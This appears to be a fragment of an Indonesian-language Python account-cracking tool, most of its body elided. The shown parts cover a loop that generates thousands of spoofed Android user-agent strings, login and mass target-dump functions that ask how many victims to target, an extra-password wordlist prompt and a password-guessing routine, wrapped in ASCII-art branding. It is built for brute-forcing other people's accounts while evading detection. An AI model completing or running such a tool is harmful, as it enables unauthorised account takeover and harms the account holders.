...
uas_string = "Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0)"
#------------------[ USER-AGENT ]--,-----------------#
ugen2=[]
ugen=[]
cokbrut=[]
...
for xd in range(10000):
	a='Mozilla/5.0 (Linux; U; Android 9'
	b='random.randrange(1, 9)'
	c='Mozilla/5.0 (Linux; Android 5.0.2; SM-T700 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36'
	d='Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N900V 4G Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36'
...
╲┃◯┃╭╮╰╯┏━━━┳╯╲
╲┃╭┃╰┏┳┳┳┳┓◯┃╲╲
			{m}•{k}•{h}•{sir} Author : 𝘿𝙞𝙣𝙙𝙖 {x}{m}•{k}•{h}•{x}''')
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
...
def dump_massal():
	try:
		...
		exit()
	try:
		jum = int(input('>> Mau Berapa Target bang ? : '))
	except ValueError:
...
#		taplikasi.append('no')
	...
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		cetak(nel('[[cyan]•[white]] Masukkan Katasandi Tambahan Minimal 6 Karakter\n[[cyan]•[white]] Contoh :[green] Alip,sayang,trisya[white] '))
...
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	print(f'>>>>> {m}•{k}•{h}•{x} Sedang Mencintai Trisya {m}•{k}•{h}•{x} <<<<< ')
	print('')
